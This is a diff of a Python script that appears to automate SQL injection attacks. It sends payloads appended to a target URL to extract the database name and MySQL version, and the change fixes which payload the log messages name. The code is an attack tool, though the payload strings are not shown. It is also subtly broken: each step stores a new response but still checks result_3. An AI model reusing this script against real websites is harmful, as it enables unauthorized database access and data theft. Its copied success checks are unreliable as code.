@@ -164,7 +164,7 @@ if URL_TARGET:
 
                             print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting Get database name....")
                             time.sleep(1)
-                            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_3))
+                            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_4))
                             result_4 = requests.get(URL_TARGET + payload_4)
                             if "The used SELECT" in result_3:
                                 print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Failed")
@@ -183,7 +183,7 @@ if URL_TARGET:
                                 
                             print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting Get version MySQL....")
                             time.sleep(1)
-                            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_3))
+                            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_5))
                             result_5 = requests.get(URL_TARGET + payload_5)
                             if "The used SELECT" in result_3:
                                 print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Failed")
